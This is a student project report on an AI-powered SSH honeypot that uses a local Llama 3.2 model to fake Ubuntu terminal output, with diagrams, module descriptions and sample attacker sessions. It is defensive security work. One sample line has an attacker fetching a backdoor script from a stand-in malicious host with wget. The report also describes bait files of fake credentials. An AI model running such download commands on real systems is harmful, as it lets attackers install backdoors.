# NEURO-TRAP: AI-POWERED SSH HONEYPOT SYSTEM
## End Semester Project Report — First Review

**Project Title:** Neuro-Trap — An AI-Powered SSH Honeypot with Real-Time Threat Intelligence Dashboard

**Technology Stack:** Python 3.x, Paramiko (SSH), Ollama + Meta Llama 3.2 (3B), Streamlit, Plotly, Pandas

---
---

## 1. INTRODUCTION

### 1.1 Overview of Cybersecurity Threat Landscape
In the modern digital era, cyberattacks have grown exponentially in both frequency and sophistication. According to the IBM X-Force Threat Intelligence Index 2024, brute-force SSH attacks remain one of the most prevalent initial access vectors used by threat actors worldwide. Attackers leverage automated tools like Hydra, Medusa, and custom botnets to launch credential-stuffing campaigns against internet-facing servers, attempting thousands of username-password combinations per hour.

### 1.2 What is a Honeypot?
A **honeypot** is a decoy computer system intentionally deployed to attract, detect, and analyze unauthorized access attempts. It mimics a real production server, tricking attackers into interacting with it while silently recording every action they perform. Honeypots serve as early-warning intrusion detection systems and are invaluable tools for:
- **Threat Intelligence Gathering** — Understanding attacker tactics, techniques, and procedures (TTPs).
- **Credential Harvesting** — Collecting commonly used passwords and usernames.
- **Malware Collection** — Capturing payloads and scripts deployed by adversaries.
- **Incident Response Training** — Providing realistic attack data for security teams.

### 1.3 Limitations of Traditional Honeypots
Traditional honeypots are classified into two categories:

| Feature | Low-Interaction Honeypot | High-Interaction Honeypot |
|---|---|---|
| **Approach** | Emulates limited services (e.g., SSH banner only) | Runs a full real operating system (e.g., vulnerable VM) |
| **Realism** | Low — returns static, pre-programmed responses | High — actual OS with real vulnerabilities |
| **Risk** | Minimal — no real OS to compromise | Very High — attacker can pivot to attack other systems |
| **Resource Cost** | Low | Very High (dedicated VM per honeypot) |
| **Detection by Attacker** | Easy — repeated commands produce identical outputs | Hard — but containment risk is severe |
| **Examples** | Cowrie (basic mode), Kippo | Actual vulnerable VMs, HoneyBadger |

Neither extreme is ideal: low-interaction honeypots are trivially fingerprinted by modern attackers, while high-interaction honeypots are dangerous and resource-intensive to deploy.

### 1.4 Proposed Solution: Neuro-Trap
**Neuro-Trap** bridges this gap by introducing a **medium-to-high interaction AI-powered SSH honeypot** that is both safe and convincing. It uses:
1. **Meta Llama 3.2 (3B)** — A local Large Language Model (LLM) running via Ollama to dynamically generate hyper-realistic terminal outputs for any command an attacker types.
2. **Virtual Filesystem** — A JSON-backed stateful filesystem that handles standard commands (`ls`, `cd`, `cat`, `pwd`) instantly without AI overhead, maintaining a persistent illusion of a real server.
3. **Paramiko SSH Server** — A professional SSH transport layer with proper handshake negotiation, mimicking an OpenSSH 8.9p1 Ubuntu server signature.
4. **Streamlit Dashboard** — A real-time threat intelligence command center with global threat maps, attack velocity timelines, credential analytics, and raw terminal intercept logs.

The result is a honeypot that feels like a genuine Ubuntu 22.04 LTS production server to the attacker, while every keystroke, login attempt, and command is silently logged and visualized in real-time.

---
---

## 2. PROBLEM STATEMENT AND OBJECTIVES

### 2.1 Problem Statement

> **"Existing SSH honeypots rely on static, pre-coded responses that sophisticated attackers can easily fingerprint and identify. There is a critical need for an intelligent, AI-powered honeypot system that generates dynamic, context-aware responses to novel attacker commands, prolonging engagement time while securely logging all threat intelligence data for analysis."**

**Detailed Problem Analysis:**
1. **Static Response Limitation:** Tools like Cowrie maintain hardcoded dictionaries of command-output pairs. When an attacker types an unregistered command (e.g., `curl ifconfig.me`, `python3 -c "import os; os.system('whoami')"`, `crontab -l`), the honeypot returns a generic error or no response, immediately revealing the deception.
2. **Lack of Statefulness:** Most low-interaction honeypots do not maintain filesystem state. If an attacker creates a file using `touch malware.sh`, then tries `ls` to see it, the file does not appear — breaking the illusion instantly.
3. **No Real-Time Analytics:** Traditional honeypots write raw text logs that require manual parsing. There is no live visualization of attack patterns, geographic origins, or credential trends.
4. **Resource vs. Risk Tradeoff:** High-interaction honeypots (full VMs) solve the realism problem but introduce severe risks — an attacker gaining true root access can use the honeypot to attack other systems on the network.

### 2.2 Objectives

| # | Objective | Description |
|---|---|---|
| O1 | **Intelligent Deception via AI** | Design and implement an SSH honeypot that uses Meta Llama 3.2 (via local Ollama API) to mimic an authentic Ubuntu 22.04 LTS production server terminal, generating dynamic outputs for complex/unknown commands. |
| O2 | **Stateful Virtual Filesystem** | Build a JSON-backed virtual filesystem that handles standard Linux commands (`cd`, `ls`, `pwd`, `cat`, `mkdir`, `touch`, `rm`, `echo`) with sub-millisecond response times, maintaining persistent state across attacker sessions. |
| O3 | **Comprehensive Credential & Command Logging** | Log all attacker interactions — authentication attempts (usernames & passwords), executed commands, session metadata (IP, timestamp, duration) — in structured JSON format for forensic analysis. |
| O4 | **Real-Time Threat Intelligence Dashboard** | Develop a Streamlit-based Command Center with live metrics, global geo-mapped threat visualization, attack velocity timelines, password analytics pie charts, and raw terminal intercept logs. |
| O5 | **Realistic SSH Emulation** | Ensure the SSH handshake, server banner, terminal escape sequences (arrow keys, backspace, Ctrl+C, Tab), and login sequence are indistinguishable from a genuine OpenSSH server. |

---
---

## 3. SYSTEM ANALYSIS

### 3.1 Study of Existing Systems

| System | Type | AI Integration | Filesystem | Dashboard | Weakness |
|---|---|---|---|---|---|
| **Cowrie** | Medium-Interaction | None — static dictionaries | Pre-built static FS | Basic text logs | Easily fingerprinted; no AI fallback for unknown commands |
| **Kippo** | Low-Interaction | None | Minimal | None | Outdated; no longer maintained; trivial to detect |
| **HoneySSH** | Low-Interaction | None | None | None | Banner-only emulation; no shell interaction |
| **Neuro-Trap (Proposed)** | Medium-High Interaction | ✅ Llama 3.2 LLM | ✅ Stateful JSON FS | ✅ Streamlit Real-time | Requires local GPU/CPU for LLM inference |

### 3.2 Feasibility Analysis

#### 3.2.1 Technical Feasibility
- **Paramiko** is a mature, well-documented Python library for SSH server implementation.
- **Ollama** enables local LLM inference without cloud API costs or internet dependency.
- **Llama 3.2 (3B)** is optimized for consumer-grade hardware (runs on 8GB RAM systems).
- **Streamlit** provides rapid dashboard development with built-in Plotly integration.

#### 3.2.2 Operational Feasibility
- System runs entirely offline (no cloud dependencies).
- Can be deployed on any machine with Python 3.8+ and Ollama installed.
- Dashboard accessible from any browser on the local network.

#### 3.2.3 Economic Feasibility
- Entire stack is **open-source and free**: Python, Paramiko, Ollama, Llama 3.2, Streamlit, Plotly.
- No licensing costs, cloud API fees, or dedicated hardware requirements.

### 3.3 Software and Hardware Requirements

**Software Requirements:**

| Component | Technology | Version |
|---|---|---|
| Programming Language | Python | 3.8+ |
| SSH Server Library | Paramiko | ≥ 3.0.0 |
| AI Inference Engine | Ollama | Latest |
| AI Model | Meta Llama 3.2 | 3B parameter variant |
| Dashboard Framework | Streamlit | ≥ 1.30.0 |
| Data Visualization | Plotly | ≥ 5.0.0 |
| Data Processing | Pandas | ≥ 2.0.0 |
| HTTP Requests | Requests | ≥ 2.31.0 |

**Hardware Requirements (Minimum):**

| Component | Specification |
|---|---|
| Processor | Intel i5 / AMD Ryzen 5 (or higher) |
| RAM | 8 GB (16 GB recommended for LLM) |
| Storage | 10 GB free (for model + logs) |
| Network | Ethernet / WiFi (for SSH connections) |
| OS | Windows 10/11, Linux, or macOS |

---
---

## 4. SYSTEM DESIGN

### 4.1 System Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                        NEURO-TRAP SYSTEM                            │
│                                                                     │
│  ┌──────────────┐     ┌────────────────────────────────────────┐    │
│  │              │     │        SSH SERVER MODULE                │    │
│  │  ATTACKER    │────►│           (server.py)                  │    │
│  │  (SSH Client)│◄────│  • Paramiko Transport Layer            │    │
│  │              │     │  • Fake Banner: OpenSSH 8.9p1 Ubuntu   │    │
│  │  Port 2222   │     │  • Accept ALL credentials (trap!)      │    │
│  └──────────────┘     │  • Terminal emulation (arrow keys,     │    │
│                       │    backspace, Ctrl+C, history)          │    │
│                       └──────┬──────────────┬──────────────────┘    │
│                              │              │                       │
│                     ┌────────▼────┐   ┌─────▼──────────────┐        │
│                     │ COMMAND     │   │                     │        │
│                     │ PARSER      │   │  LOGGER MODULE      │        │
│                     │             │   │  (logger.py)        │        │
│                     └──┬──────┬──┘   │                     │        │
│                        │      │      │  • JSON file logging │        │
│            ┌───────────▼┐   ┌─▼──────│  • Console coloring  │        │
│            │ Standard   │   │ Unknown│  • Event types:      │        │
│            │ Command?   │   │ or     │    CONNECTION,       │        │
│            │            │   │ Complex│    AUTH_LOGIN,        │        │
│            │ cd,ls,pwd  │   │ Command│    COMMAND,           │        │
│            │ cat,rm,    │   │        │    DISCONNECT,        │        │
│            │ whoami,ps  │   │        │    ERROR              │        │
│            │ ifconfig   │   │        └─────────┬────────────┘        │
│            └─────┬──────┘   └──┬───────┐       │                    │
│                  │             │       │       │                    │
│          ┌───────▼───────┐  ┌──▼───────▼──┐    │                    │
│          │  VIRTUAL FS   │  │  AI ENGINE  │    │                    │
│          │ (virtual_fs.py│  │(ai_engine.py│    │                    │
│          │               │  │             │    │                    │
│          │ • JSON state  │  │ • Ollama API│    │                    │
│          │ • Directory   │  │ • Llama 3.2 │    │                    │
│          │   traversal   │  │ • System    │    │                    │
│          │ • File CRUD   │  │   prompt    │    │                    │
│          │ • Persistent  │  │   engineered│    │                    │
│          │   across      │  │ • Markdown  │    │                    │
│          │   sessions    │  │   cleanup   │    │                    │
│          └───────────────┘  └─────────────┘    │                    │
│                                                │                    │
│          ┌─────────────────────────────────┐    │                    │
│          │  DASHBOARD MODULE               │◄───┘                    │
│          │  (dashboard.py)                 │   reads                 │
│          │                                 │   honeypot.json         │
│          │  • Streamlit Web GUI            │                        │
│          │  • Global Threat Map (Plotly)   │                        │
│          │  • Attack Velocity Timeline     │                        │
│          │  • Password Analytics Pie Chart │                        │
│          │  • Raw Terminal Intercept Logs  │                        │
│          │  • Cyberpunk Neon Theme         │                        │
│          └─────────────────────────────────┘                        │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.2 Data Flow Diagram (DFD)

#### DFD Level 0 (Context Diagram)

```
                           ┌───────────────────────┐
    SSH Connection         │                       │        Threat Metrics
    + Commands             │                       │        + Analytics
┌──────────┐ ─────────────►│    NEURO-TRAP         │────────────────► ┌──────────────┐
│ ATTACKER │               │    HONEYPOT           │                  │ SECURITY     │
│          │◄──────────────│    SYSTEM             │                  │ ANALYST      │
└──────────┘  Fake Terminal│                       │                  │ (Dashboard)  │
              Responses    │                       │                  └──────────────┘
                           └───────────┬───────────┘
                                       │
                                       │ JSON Event Logs
                                       ▼
                              ┌────────────────┐
                              │ LOG DATA STORE │
                              │ (honeypot.json)│
                              └────────────────┘
```

#### DFD Level 1 (Detailed)

```
                    ┌──────────────────────────────────────────────────┐
                    │               NEURO-TRAP SYSTEM                  │
                    │                                                  │
┌──────────┐        │  ┌────────┐     ┌────────────┐    ┌──────────┐  │
│          │  SSH   │  │ 1.0    │     │    2.0     │    │   3.0    │  │
│ ATTACKER │───────►│  │ AUTH   │────►│  COMMAND   │───►│ RESPONSE │  │
│          │        │  │ MODULE │     │  ROUTER    │    │ GENERATOR│  │
│          │◄───────│  │        │     │            │    │          │  │
└──────────┘  Fake  │  └───┬────┘     └─────┬──────┘    └──┬───────┘  │
              Output│      │                │              │          │
                    │      │          ┌─────┴─────┐        │          │
                    │      │          │           │        │          │
                    │      │     ┌────▼───┐  ┌───▼────┐   │          │
                    │      │     │  2.1   │  │  2.2   │   │          │
                    │      │     │VIRTUAL │  │  AI    │   │          │
                    │      │     │  FS    │  │ ENGINE │   │          │
                    │      │     └────────┘  └────────┘   │          │
                    │      │                              │          │
                    │      ▼                              │          │
                    │  ┌────────┐                         │          │
                    │  │  4.0   │◄────────────────────────┘          │
                    │  │ LOGGER │                                    │
                    │  │        │─────────► ┌──────────────┐         │
                    │  └────────┘           │ honeypot.json│         │
                    │                       └──────┬───────┘         │
                    │                              │                 │
                    │                       ┌──────▼───────┐         │
                    │                       │     5.0      │         │
                    │                       │  DASHBOARD   │────────►│ SECURITY
                    │                       │              │         │ ANALYST
                    │                       └──────────────┘         │
                    └──────────────────────────────────────────────────┘
```

### 4.3 UML Use Case Diagram

```
┌────────────────────────────────────────────────────────────────────────┐
│                        NEURO-TRAP SYSTEM                               │
│                                                                        │
│   ┌─────────────────────────────────────────────────────┐              │
│   │                  USE CASES                          │              │
│   │                                                     │              │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC1: Initiate SSH Connection     │◄─────────────│──── ATTACKER │
│   │   └──────────────────────────────────┘              │     (Actor)  │
│   │                                                     │              │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC2: Authenticate with Creds     │◄─────────────│──── ATTACKER │
│   │   └──────────────┬───────────────────┘              │              │
│   │                  │ <<includes>>                      │              │
│   │                  ▼                                   │              │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC3: Log Credentials to JSON     │              │              │
│   │   └──────────────────────────────────┘              │              │
│   │                                                     │              │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC4: Execute Recon Commands      │◄─────────────│──── ATTACKER │
│   │   │     (ls, pwd, whoami, ps, etc.)  │              │              │
│   │   └──────────────┬───────────────────┘              │              │
│   │                  │ <<includes>>                      │              │
│   │                  ▼                                   │              │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC5: Serve Response from         │              │              │
│   │   │      Virtual Filesystem          │              │              │
│   │   └──────────────────────────────────┘              │              │
│   │                                                     │              │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC6: Execute Malicious Payloads  │◄─────────────│──── ATTACKER │
│   │   │     (wget, curl, python, etc.)   │              │              │
│   │   └──────────────┬───────────────────┘              │              │
│   │                  │ <<includes>>                      │              │
│   │                  ▼                                   │              │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC7: Generate AI Response        │              │              │
│   │   │      via Llama 3.2               │              │              │
│   │   └──────────────────────────────────┘              │              │
│   │                                                     │              │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC8: View Global Threat Map      │◄─────────────│──── SECURITY │
│   │   └──────────────────────────────────┘              │     ANALYST  │
│   │                                                     │     (Actor)  │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC9: Analyze Breached Creds      │◄─────────────│──── SECURITY │
│   │   └──────────────────────────────────┘              │     ANALYST  │
│   │                                                     │              │
│   │   ┌──────────────────────────────────┐              │              │
│   │   │ UC10: View Raw Terminal Logs     │◄─────────────│──── SECURITY │
│   │   └──────────────────────────────────┘              │     ANALYST  │
│   │                                                     │              │
│   └─────────────────────────────────────────────────────┘              │
└────────────────────────────────────────────────────────────────────────┘

ACTORS:
  • Attacker (Primary)    — Malicious user attempting unauthorized SSH access
  • Security Analyst      — Authorized user monitoring the dashboard
```

### 4.4 UML Class Diagram

```
┌─────────────────────────────────────────────┐
│              HoneypotServer                  │
│          (paramiko.ServerInterface)           │
├──────────────────────────────────────────────┤
│ - event: threading.Event                     │
│ - client_addr: tuple                         │
│ - username: str                              │
│ - password: str                              │
├──────────────────────────────────────────────┤
│ + check_channel_request(kind, chanid): int   │
│ + check_auth_password(user, pwd): int        │
│ + get_allowed_auths(username): str           │
│ + check_channel_shell_request(channel): bool │
│ + check_channel_pty_request(...): bool       │
└──────────────────────────────────────────────┘
                       │ uses
                       ▼
┌─────────────────────────────────────────────┐
│                VirtualFS                     │
├──────────────────────────────────────────────┤
│ - fs: dict (JSON filesystem tree)            │
│ - current_path: str                          │
├──────────────────────────────────────────────┤
│ + __init__()                                 │
│ + _load_state(): dict                        │
│ + _save_state(): void                        │
│ + _get_node(path): dict|str|None             │
│ + _resolve_path(path): str                   │
│ + get_pwd(): str                             │
│ + change_dir(path): str                      │
│ + list_dir(args_str): str                    │
│ + make_dir(path): str                        │
│ + touch(path): str                           │
│ + read_file(path): str|None                  │
│ + write_file(path, content): str             │
│ + remove_path(path, recursive): str          │
└──────────────────────────────────────────────┘
                       │ uses (fallback)
                       ▼
┌─────────────────────────────────────────────┐
│              ai_engine (module)               │
├──────────────────────────────────────────────┤
│ - MODEL_NAME: str = "llama3.2"               │
│ - SYSTEM_PROMPT: str                         │
├──────────────────────────────────────────────┤
│ + generate_response(command,                 │
│     context_history): str                    │
└──────────────────────────────────────────────┘
                       │ logs to
                       ▼
┌─────────────────────────────────────────────┐
│              logger (module)                  │
├──────────────────────────────────────────────┤
│ - LOG_DIR: str                               │
│ - LOG_FILE: str                              │
│ - logger: logging.Logger                     │
├──────────────────────────────────────────────┤
│ + log_event(level, event_type,               │
│     message, ip, details): void              │
├──────────────────────────────────────────────┤
│  Inner Classes:                              │
│  • JsonFormatter(logging.Formatter)          │
│  • ConsoleFormatter(logging.Formatter)       │
└──────────────────────────────────────────────┘
```

### 4.5 UML Sequence Diagram (Attacker Login Flow)

```
 ATTACKER          SERVER.PY        HONEYPOT_SERVER    LOGGER       VIRTUAL_FS     AI_ENGINE
    │                  │                  │               │              │              │
    │──SSH Connect────►│                  │               │              │              │
    │  (Port 2222)     │                  │               │              │              │
    │                  │──Create Transport│               │              │              │
    │                  │──Load Host Key   │               │              │              │
    │                  │──start_server()─►│               │              │              │
    │                  │                  │               │              │              │
    │◄─SSH Banner──────│                  │               │              │              │
    │  "SSH-2.0-       │                  │               │              │              │
    │  OpenSSH_8.9p1"  │                  │               │              │              │
    │                  │                  │               │              │              │
    │──Auth(root,123)─►│                  │               │              │              │
    │                  │──check_auth_pwd─►│               │              │              │
    │                  │                  │──log_event()─►│              │              │
    │                  │                  │  AUTH_LOGIN    │              │              │
    │                  │◄─AUTH_SUCCESSFUL─│               │              │              │
    │                  │                  │               │              │              │
    │◄─Welcome Banner──│                  │               │              │              │
    │  "Ubuntu 22.04"  │                  │               │              │              │
    │                  │──init VirtualFS─►│               │──__init__()─►│              │
    │                  │                  │               │              │              │
    │◄─Prompt──────────│ "root@prod:~# "  │               │              │              │
    │                  │                  │               │              │              │
    │──"ls -la"───────►│                  │               │              │              │
    │                  │──log_event()─────│───────────────│──────────────│──────────────│
    │                  │  COMMAND         │               │              │              │
    │                  │──list_dir("-la")─│───────────────│──────────────│              │
    │                  │                  │               │◄─file list───│              │
    │◄─File Listing────│                  │               │              │              │
    │                  │                  │               │              │              │
    │──"wget mal.sh"──►│                  │               │              │              │
    │                  │──log_event()─────│───────────────│──────────────│──────────────│
    │                  │  COMMAND         │               │              │              │
    │                  │──(not standard)──│───────────────│──────────────│──gen_resp()─►│
    │                  │                  │               │              │  Llama 3.2   │
    │                  │                  │               │              │◄─AI output───│
    │◄─Fake wget output│                  │               │              │              │
    │                  │                  │               │              │              │
    │──"exit"─────────►│                  │               │              │              │
    │                  │──log_event()─────│──DISCONNECT───│              │              │
    │◄─"logout"────────│                  │               │              │              │
    │  [Connection     │                  │               │              │              │
    │   Closed]        │                  │               │              │              │
```

### 4.6 UML Activity Diagram (Command Processing Flow)

```
                           ┌─────────────┐
                           │   START     │
                           └──────┬──────┘
                                  │
                                  ▼
                    ┌─────────────────────────┐
                    │ Receive character input  │
                    │ from SSH channel         │
                    └────────────┬─────────────┘
                                 │
                                 ▼
                    ┌─────────────────────────┐
                    │ Is it Enter key?         │
                    │ (\r or \n)               │
                    └────┬──────────────┬──────┘
                         │ NO           │ YES
                    ┌────▼────┐    ┌────▼────────────────────┐
                    │ Buffer  │    │ Extract command string   │
                    │ the char│    │ from buffer              │
                    └─────────┘    └────────────┬─────────────┘
                                                │
                                                ▼
                                   ┌────────────────────────┐
                                   │ Is command "exit"?      │
                                   └───┬────────────────┬────┘
                                       │ YES            │ NO
                                  ┌────▼────┐           │
                                  │ Close   │           ▼
                                  │ Session │  ┌────────────────────┐
                                  │  END    │  │ Log command via    │
                                  └─────────┘  │ logger.log_event() │
                                               └────────┬───────────┘
                                                        │
                                                        ▼
                                          ┌──────────────────────────┐
                                          │ Is it a filesystem       │
                                          │ command? (cd/ls/pwd/     │
                                          │ cat/mkdir/touch/rm/echo) │
                                          └──┬───────────────────┬───┘
                                             │ YES               │ NO
                                             ▼                   ▼
                                   ┌─────────────────┐  ┌────────────────────┐
                                   │ Process via      │  │ Is it a hardcoded  │
                                   │ VirtualFS module │  │ command? (whoami,  │
                                   │ (virtual_fs.py)  │  │ ps, ifconfig,      │
                                   └────────┬─────────┘  │ uname, netstat,    │
                                            │            │ ping, history)     │
                                            │            └──┬─────────────┬───┘
                                            │               │ YES         │ NO
                                            │               ▼             ▼
                                            │    ┌──────────────┐ ┌──────────────────┐
                                            │    │ Return static│ │ Route to AI      │
                                            │    │ hardcoded    │ │ Engine module    │
                                            │    │ output       │ │ (ai_engine.py)   │
                                            │    └──────┬───────┘ │ Llama 3.2        │
                                            │           │         │ generates output  │
                                            │           │         └────────┬──────────┘
                                            │           │                  │
                                            ▼           ▼                  ▼
                                   ┌──────────────────────────────────────────┐
                                   │ Send response to attacker via SSH       │
                                   │ channel.send(formatted_response)         │
                                   └───────────────────┬──────────────────────┘
                                                       │
                                                       ▼
                                              ┌────────────────┐
                                              │ Show prompt    │
                                              │ "root@prod:~#" │
                                              │ Wait for next  │
                                              │ input           │
                                              └────────────────┘
```

---
---

## 5. LIST OF MODULES (DETAILED)

### Module 1: SSH Key Generation Module (`keys/generate_key.py`)
- **Purpose:** One-time setup module to generate a 2048-bit RSA host key for the SSH server.
- **Technology:** Paramiko RSAKey generator.
- **Functionality:**
  - Generates a cryptographic RSA key pair.
  - Saves the private key to `keys/server_key`.
  - Includes overwrite protection (prompts if key already exists).
- **Lines of Code:** 27

### Module 2: SSH Transport & Shell Emulation Module (`server/server.py`)
- **Purpose:** Core server module that listens for incoming SSH connections, performs the SSH handshake, accepts any credentials (the trap), and manages the interactive shell session.
- **Technology:** Python socket, threading, Paramiko Transport, select.
- **Key Class: `HoneypotServer(paramiko.ServerInterface)`**
  - `check_auth_password()` — Accepts ANY username/password. This is the honeypot trap. Logs credentials via Logger.
  - `check_channel_shell_request()` — Grants shell access after authentication.
  - `check_channel_pty_request()` — Allocates a pseudo-terminal for the attacker.
- **Key Function: `handle_connection()`**
  - Fakes SSH banner as `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1`.
  - Sends Ubuntu 22.04 LTS welcome banner with fake "Last login" timestamp.
  - Implements a full terminal emulator with support for:
    - Arrow keys (Up/Down for history, Left/Right for cursor movement)
    - Backspace, Delete, Home, End keys
    - Ctrl+A (start of line), Ctrl+E (end of line), Ctrl+U (clear line)
    - Ctrl+C (cancel command), Ctrl+D (disconnect), Ctrl+L (clear screen)
    - Command history navigation (like real bash)
  - Routes commands to Virtual FS or AI Engine based on command type.
- **Key Function: `main()`**
  - Creates TCP server socket on port 2222 with `SO_REUSEADDR`.
  - Uses `select.select()` for non-blocking accept (allows graceful Ctrl+C shutdown).
  - Spawns daemon threads for each connection (supports multiple simultaneous attackers).
- **Lines of Code:** 455

### Module 3: Virtual Filesystem Module (`server/virtual_fs.py`)
- **Purpose:** Maintains a persistent, stateful, JSON-backed virtual filesystem that simulates a realistic Linux directory structure.
- **Technology:** Python, JSON, posixpath.
- **Key Class: `VirtualFS`**
  - `__init__()` — Loads filesystem state from `fs_state.json` or creates default structure.
  - `_load_state()` / `_save_state()` — Persistence layer using JSON serialization.
  - `_resolve_path()` — Resolves relative paths (`.`, `..`) to absolute paths.
  - `_get_node()` — Navigates the nested dictionary tree to find any node.
  - `change_dir(path)` — Simulates `cd` with error handling for invalid paths.
  - `list_dir(args_str)` — Simulates `ls` with support for `-l`, `-a`, `-la` flags, generating realistic permissions (`drwxr-xr-x`), ownership (`root root`), file sizes, and dates.
  - `make_dir(path)` — Simulates `mkdir` with duplicate detection.
  - `touch(path)` — Simulates `touch` (create empty files).
  - `read_file(path)` — Simulates `cat` (returns file content from virtual FS).
  - `write_file(path, content)` — Simulates `echo "text" > file` (write content).
  - `remove_path(path, recursive)` — Simulates `rm` and `rm -r` with proper directory checks.
- **Default Filesystem Contents:**
  - `/root/Documents/passwords.txt` — `admin:Sup3rS3cr3t123!` (bait file)
  - `/root/Documents/project_notes.txt` — Fake confidential data
  - `/root/Documents/server_keys/id_rsa` — Fake SSH private key
  - `/root/secret_data/bitcoin_wallet.dat` — Fake encrypted wallet (bait)
  - `/root/secret_data/employee_list.csv` — Fake employee salary data
  - `/etc/passwd` — Realistic passwd file with root, user, postgres
  - `/etc/shadow` — Fake shadow hashes
  - `/var/www/html/config.php` — Fake PHP config with database credentials
  - `/var/log/auth.log` — Fake authentication log entries
- **Lines of Code:** 268

### Module 4: Generative AI Engine Module (`server/ai_engine.py`)
- **Purpose:** The intelligence core of Neuro-Trap. Interfaces with Meta Llama 3.2 (3B) running locally via Ollama to generate dynamic, realistic terminal outputs for any command the attacker types that is not handled by the Virtual Filesystem.
- **Technology:** Ollama Python SDK, Llama 3.2 (3B parameters).
- **System Prompt Engineering:** The AI is instructed via a carefully crafted system prompt:
  ```
  "You are a Ubuntu 22.04 LTS Linux terminal.
   You are NOT an AI assistant. You do NOT explain things.
   You ONLY output the exact text that the command would produce."
  ```
- **Key Function: `generate_response(command)`**
  - Constructs message history with system prompt + user command.
  - Calls `ollama.chat(model="llama3.2", messages=...)`.
  - Cleans up markdown formatting (removes ` ```bash ` blocks if LLM adds them).
  - Returns clean terminal-style output.
  - Graceful fallback: If Ollama is offline, returns "Error: AI Engine offline."
- **Lines of Code:** 68

### Module 5: Telemetry & Event Logger Module (`server/logger.py`)
- **Purpose:** Centralized logging system that captures ALL honeypot events in structured JSON format for dashboard consumption and forensic analysis.
- **Technology:** Python `logging` module, JSON.
- **Dual Output Architecture:**
  - **File Handler** — Writes JSON objects (one per line) to `logs/honeypot.json`.
  - **Console Handler** — Pretty-prints color-coded events to the terminal running the server.
- **Inner Classes:**
  - `JsonFormatter(logging.Formatter)` — Formats log records as JSON with fields: `timestamp`, `level`, `event_type`, `ip`, `message`, `details`.
  - `ConsoleFormatter(logging.Formatter)` — Color-coded console output (Green=INFO, Yellow=WARNING, Red=ERROR).
- **Key Function: `log_event(level, event_type, message, ip, details)`**
  - Unified API called by all other modules.
  - Event types: `SYSTEM`, `CONNECTION`, `AUTH_LOGIN`, `AUTH_SUCCESS`, `COMMAND`, `DISCONNECT`, `ERROR`.
- **Lines of Code:** 79

### Module 6: Threat Intelligence Dashboard (`dashboard.py`)
- **Purpose:** Real-time web-based Command Center for monitoring and analyzing honeypot attack data.
- **Technology:** Streamlit, Plotly, Pandas, CSS.
- **Features:**
  1. **Cyberpunk Neon Theme** — Custom CSS with dark background (#0d1117), neon green (#00ff41) text, glitch animation title, terminal-style fonts.
  2. **Key Metrics Row** — Critical Incidents count, Unique Adversaries, Top Target Username, Most Breached Password.
  3. **Global Threat Map** — IP addresses hashed (MD5) to deterministically map to real-world APT hotspots (Moscow, Beijing, San Francisco, London, Tokyo, São Paulo, New Delhi, Paris, New York, Shanghai) with jitter for spread.
  4. **Threat Vectors Bar Chart** — Distribution of event types (CONNECTION, AUTH_LOGIN, COMMAND, DISCONNECT).
  5. **Attack Velocity Timeline** — Events-per-minute line chart showing attack intensity over time.
  6. **Breached Credentials Pie Chart** — Top 5 most attempted passwords in donut chart format.
  7. **Terminal Intercept Logs** — Filterable raw log table with timestamp, event_type, IP, message, and details, styled like a hacker terminal.
- **Lines of Code:** 348

---
---

## 6. OUTPUT OF MODULE 1 — SSH SERVER & AUTHENTICATION

### 6.1 Server Startup Output

When the administrator starts the honeypot server with `python server/server.py`, the following output is displayed:

```
     ╔═══════════════════════════════════════════════════════════╗
     ║                    NEURO-TRAP HONEYPOT                    ║
     ║              AI-Powered SSH Deception System              ║
     ╚═══════════════════════════════════════════════════════════╝

[17:50:00] [SYSTEM] Honeypot listening on 0.0.0.0:2222
[17:50:00] [SYSTEM] AI Engine: Llama 3.2 (3B) 🧠
[17:50:00] [SYSTEM] Waiting for attackers...

[+] Connect with: ssh root@localhost -p 2222
```

### 6.2 Attacker's Terminal View (What They See)

When a real attacker (or tester) connects to the honeypot, they see an output **indistinguishable from a genuine Ubuntu server**:

```bash
$ ssh root@10.0.0.45 -p 2222
root@10.0.0.45's password: [enters: Admin@123]

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Sat Feb 22 17:50:12 2026 from 10.0.0.1
root@production-server:~#
```

### 6.3 Attacker Interaction — Command Execution Examples

**Example 1: Standard Filesystem Commands (handled by VirtualFS)**

```bash
root@production-server:~# ls -la
total 24
drwxr-xr-x  2 root  root   4096 Feb 10 10:00 .
drwxr-xr-x  2 root  root   4096 Feb 10 10:00 ..
-rw-r--r--  1 root  root     65 Feb 10 10:00 .bash_history
-rw-r--r--  1 root  root     55 Feb 10 10:00 .bashrc
drwxr-xr-x  2 root  root   4096 Feb 10 10:00 Desktop
drwxr-xr-x  2 root  root   4096 Feb 10 10:00 Documents
drwxr-xr-x  2 root  root   4096 Feb 10 10:00 Downloads
drwxr-xr-x  2 root  root   4096 Feb 10 10:00 secret_data

root@production-server:~# cd Documents
root@production-server:/root/Documents# cat passwords.txt
admin:Sup3rS3cr3t123!
db_user:qwerty99

root@production-server:/root/Documents# cd ../secret_data
root@production-server:/root/secret_data# cat bitcoin_wallet.dat
enc:aes256:09a8f7d6e5c4b3a210

root@production-server:/root/secret_data# whoami
root

root@production-server:/root/secret_data# uname -a
Linux production-server 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

**Example 2: AI-Generated Response (handled by Llama 3.2)**

```bash
root@production-server:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
postgres:x:112:115::/var/lib/postgresql:/bin/bash

root@production-server:~# wget http://malicious-site.com/backdoor.sh
